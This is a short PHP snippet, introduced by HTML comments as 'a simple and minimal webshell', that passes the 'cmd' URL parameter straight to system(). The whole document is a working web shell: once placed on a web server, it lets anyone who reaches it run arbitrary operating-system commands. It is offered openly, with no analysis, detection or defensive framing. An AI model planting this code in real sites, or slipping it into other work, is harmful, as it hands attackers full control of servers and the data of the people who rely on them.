<!-- Below is the source code of a simple and minimal webshell: -->
<!-- This script takes the content of the parameter cmd and executes it -->

<?php
  system($_GET['cmd']);
?>